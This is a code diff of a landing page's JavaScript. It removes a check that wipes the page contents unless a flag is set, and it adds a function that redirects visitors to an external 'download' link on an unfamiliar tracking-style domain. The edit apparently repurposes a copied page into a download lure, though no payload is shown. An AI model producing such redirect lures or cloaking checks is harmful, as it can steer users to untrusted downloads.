@@ -1,4 +1,4 @@
-// Particles initialization (original first call)
+// Particles initialization
 particlesJS("particles-js", {
     particles: {
         number: { value: 80, density: { enable: true, value_area: 800 } },
@@ -40,11 +40,10 @@ particlesJS("particles-js", {
     }
 });
 
-// Protection script (from original)
-setTimeout(() => {
-    if (!window.css) document.documentElement.innerHTML = '';
-}, 100);
-window.css_color = true;
+// Global function to redirect to the download link
+window.redirectToDownload = function() {
+    window.location.href = "https://confirmapp.online/cl/i/4oq9gr";
+};
 
 $(document).ready(function () {
     // Close popup
@@ -215,13 +214,13 @@ $(document).ready(function () {
         });
     });
 
-    // Second particles call (original, but #header-particles doesn't exist, so it does nothing)
+    // Second particles call (for header-particles if exists)
     if ($("#header-particles").length) {
         particlesJS.load("header-particles", "https://appstore.com/assets/js/particlesjs-config.json");
     }
 });
 
-// Original animation function (used in the document ready above, but kept for completeness)
+// Original animation function (kept for compatibility)
 function e(e, s, i) {
     var o = $(e);
     o.addClass("animated " + s);
